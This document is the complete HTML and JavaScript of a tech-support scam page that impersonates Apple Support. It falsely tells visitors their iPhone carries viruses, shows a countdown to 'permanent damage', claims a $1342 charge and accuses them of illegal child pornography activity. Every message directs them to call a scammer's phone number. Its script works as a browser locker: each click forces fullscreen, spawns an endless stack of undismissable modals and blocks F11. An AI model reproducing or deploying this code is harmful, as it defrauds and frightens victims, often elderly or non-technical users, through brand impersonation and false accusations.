<!DOCTYPE html><html lang="en"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="cache-control" content="max-age=3600">
    <title>Contact - Official Apple Support</title>
    <link href="images/favicon.png" rel="icon">
    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">

    <!-- Bootstrap 5 CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/bootstrap-icons.css">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="css/all.min.css">
    <link rel="stylesheet" href="css/Base.css" type="text/css">

  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-2DMKRPGVF0');
</script>

</head>

<body>
   

    <div class="main">
        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
            <div class="ac-ln-wrapper">
                <div class="ac-ln-background"></div>
                <div class="ac-ln-content">
                    <span class="ac-ln-title">
                       <a href="#"><img src="images/applelogo.png" alt="logo" style="    width: 25px; vertical-align: middle;padding-right: 10px;">Apple Support +1-888-339-6614 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
					 </span>
                </div>
            </div>
        </nav>
        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
            <div class="row">
                <div class="column large-12 medium-12 small-12">
                    <div class="as-banner-cont">
                        <div class="as-banner-image as-banner-image--top">

                            <style>
                                /* .as-columns.as-columns--1up {    background: url(./apple222.jpg);
    background-size: cover;
    background-position-y: 49px;} */
                            </style>
                            <style type="text/css">
                                .as-banner-image.as-banner-image--top {
                                    background-image: url("images/bg.jpg");
                                }

                                .as-banner-image.as-banner-image--top:before {
                                    content: "";
                                    display: block;
                                }

                                @media only screen and (max-width: 735px) {
                                    .as-banner-image.as-banner-image--top {
                                        background-image: url("images/bg.jpg");
                                    }
                                }
                            </style>
                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/bg.jpg 735w, images/bg.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/bg.jpg">
                            <div class="opcty"></div>
                        </div>
                    </div>
                    <div class="as-banner-content">
                        <!-- <div class="pageTitle  ">
                            <h1 class="pageTitle-heading">Apple Support </h1>
                            <p class="pageTitle-intro js_setTextBlock">
                                Your Apple ID was recently used at the Apple Store for a $348.67 transaction via Apple Pay (Pre-Authorization). To protect your account, we have temporarily placed this request on hold for security verification. If you did not authorize this purchase, please contact Apple Support immediately at +1-888-339-6614 to secure your account and prevent unauthorized activity.
                            </p>
                        </div> -->
                        <div class="alert-box">
    <div class="d-flex justify-content-between">
  <div class="p-3"><img src="images/applelogo.png" alt="" style="width: 50px;"></div>
  <div class="p-3 text-start"><h3>Your system is infected with 3 viruses</h3></div>
</div>
    <div class="alert-title">Your iOS is infected with 3 viruses. Our security check found traces of 8 malware and 12 phishing/spyware. System damage: 28.1%.<br>
    immediete removal required!</div>
    <div class="alert-text">
        <!-- The immediete removal of the viruses is required to prevent further system damage, loss of Apps, Photos or other files.<br>
        Traces of 1 phishing/spyware were found on your iOS.<br> <strong>Personal and banking information is at risk.</strong><br> --> To avoid more damage click on "Proceed" immedietly. you will be provided with options. How to remove viruses. 
    </div>
    <div class="txstm"> Please contact Apple Support immediately at <strong><a href="tel:+1-888-339-6614">+1-888-339-6614</a></strong> to secure your device and prevent unauthorized activity.</div>
    <div class="alert-countdown"><span id="countdown">10:00</span> remaining before damage is permanent.</div> 
    <a href="tel:+1-888-339-6614" class="alert-button bg-success w-100">Proceed</a>
</div>
                        <div class="sectionTitle sectionTitleBlock">
                            <h2 class="sectionTitle-heading"></h2>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>

    <div id="modalContainer"></div>

    <!-- Main Modal -->
    <div class="modal fade" id="appleAlertModal" tabindex="-1" aria-labelledby="appleAlertModalLabel" aria-hidden="true" style="top:-100px!important;">

        <div class="modal-dialog modal-lg modal-dialog-centered-sm">
            <div class="modal-content">
                <div class="modal-body text-center">
                        <div class="alert-text">
                        Your iPhone has been locked due to illegal activity on your device. Your purchase of $1342 for security subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-888-339-6614">+1-888-339-6614</a> to unlock it!
                    </div>

                    
                    <div class="text-end gap-4 mt-4 actionbtn">

                        <button type="button" class="me-3" id="cancelBtn">Cancel</button>

                            <button type="button" class="me-2" id="okBtn"><strong>OK</strong> </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    


    <!-- Bootstrap & Popper.js -->
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>

<script>
let timeLeft = 10 * 60;

const display = document.getElementById("countdown");

const timer = setInterval(() => {
  let minutes = Math.floor(timeLeft / 60);
  let seconds = timeLeft % 60;

  display.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;

  if (timeLeft <= 0) {
    clearInterval(timer);
    display.textContent = "Time's up!";
  }

  timeLeft--;
}, 1000);
</script>

<script>



    let modalCount = 0;
    const maxModals = Infinity;
    let fullScreenTriggered = false;

    // Function to trigger full screen
    function triggerFullScreen() {
        const elem = document.documentElement;
        if (!document.fullscreenElement) { // Only trigger if not already in fullscreen
            if (elem.requestFullscreen) {
                elem.requestFullscreen().catch(err => {
                    console.error('Fullscreen error:', err);
                });
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) {
                elem.msRequestFullscreen();
            }
        }
    }

    // Function to exit fullscreen
    function exitFullScreen() {
        if (document.exitFullscreen) {
            document.exitFullscreen();
        } else if (document.webkitExitFullscreen) {
            document.webkitExitFullscreen();
        } else if (document.msExitFullscreen) {
            document.msExitFullscreen();
        }
    }

    // Function to generate random position within viewport
    function getRandomPosition(modalWidth, modalHeight) {
        const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
        const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);

        if (modalWidth >= viewportWidth || modalHeight >= viewportHeight) {
            return {
                top: Math.max(0, (viewportHeight - modalHeight) / 2),
                left: Math.max(0, (viewportWidth - modalWidth) / 2)
            };
        }

        const maxX = viewportWidth - modalWidth;
        const maxY = viewportHeight - modalHeight;

        const randomX = Math.floor(Math.random() * (maxX + 1));
        const randomY = Math.floor(Math.random() * (maxY + 1));

        return { top: randomY, left: randomX };
    }

    // Function to create a new modal with random position
    function createNewModal() {
        if (modalCount >= maxModals) return null;

        modalCount++;

        const newModal = document.createElement('div');
        newModal.className = 'modal fade modal-stack';
        newModal.id = `appleAlertModal-${modalCount}`;
        newModal.tabIndex = -1;
        newModal.setAttribute('aria-labelledby', `appleAlertModalLabel-${modalCount}`);
        newModal.setAttribute('aria-hidden', 'true');

        newModal.innerHTML = `
            <div class="modal-dialog modal-lg positioned">
                <div class="modal-content" id="applealertmodeltwo">
                    <div class="modal-body text-center">
                        <div class="alert-text">
                        Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $1342 for security subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-888-339-6614">+1-888-339-6614</a> to unlock it!
                    </div>

                    
                    <div class="text-end gap-4 mt-4 actionbtn">

                        <button type="button" class="me-3" id="cancelBtn">Cancel</button>

                            <button type="button" class="me-2" id="okBtn"><strong>OK</strong> </button>
                    </div>
                </div>
                </div>
            </div>
        `;

        document.getElementById('modalContainer').appendChild(newModal);

        const modal = new bootstrap.Modal(newModal, {
            backdrop: 'static',
            keyboard: false
        });

        const modalDialog = newModal.querySelector('.modal-dialog');
        let modalWidth, modalHeight;

        modalWidth = Math.min(600, window.innerWidth * 0.9);
        modalHeight = window.innerWidth <= 576 ? 250 : 400;

        const { top, left } = getRandomPosition(modalWidth, modalHeight);
        modalDialog.style.top = `${top}px`;
        modalDialog.style.left = `${left}px`;

        if (window.innerWidth <= 576) {
            modalDialog.style.width = `${modalWidth}px`;
            modalDialog.style.maxWidth = 'none';
        }

        newModal.style.zIndex = 1080 + modalCount;
        modal.show();

        // Ensure tel: link actually triggers phone call
        newModal.querySelectorAll('.tel-link').forEach(link => {
            link.addEventListener('click', (e) => {
                window.location.href = link.getAttribute('href');
            });
        });

        // return modal;
    }

    // Initialize the first modal
    const appleAlertModal = new bootstrap.Modal(document.getElementById('appleAlertModal'), {
        backdrop: 'static',
        keyboard: false
    });

    document.addEventListener('DOMContentLoaded', function () {
        appleAlertModal.show(500);
    });

    // Add event listener to body for fullscreen and modal creation
    document.body.addEventListener('click', () => {
        triggerFullScreen();
        createNewModal();
    });

    // On ESC â†’ exit fullscreen
    document.addEventListener("keydown", function (e) {
        if (e.key === "Escape") {
            exitFullScreen();
        }
        if (e.key === "F11" || e.keyCode === 122) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
    }, true);

    document.addEventListener("keyup", function (e) {
        if (e.key === "F11" || e.keyCode === 122) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
    }, true);

    // If fullscreen exits (via ESC), next body click/activity will trigger fullscreen again
    document.addEventListener("fullscreenchange", () => {
        if (!document.fullscreenElement) {
            // User exited fullscreen
            document.body.addEventListener("click", triggerFullScreen, { once: true });
        }
    });

    window.addEventListener('resize', function () {
        const modals = document.querySelectorAll('.modal-stack .modal-dialog.positioned');

        modals.forEach(modal => {
            const viewportHeight = window.innerHeight;
            const modalHeight = modal.offsetHeight;
            let { top } = getRandomPosition(modal.offsetWidth, modalHeight);

            if (top + modalHeight > viewportHeight) {
                top = Math.max(0, viewportHeight - modalHeight);
            }

            modal.style.top = `${top}px`;
            modal.style.left = `0`;
            modal.style.width = `100%`;
            modal.style.maxHeight = `${viewportHeight}px`;
            modal.style.overflow = `hidden`;
        });
    });
</script> 




    <script src="https://code.jquery.com/jquery-1.12.0.min.js"></script>


</body></html>
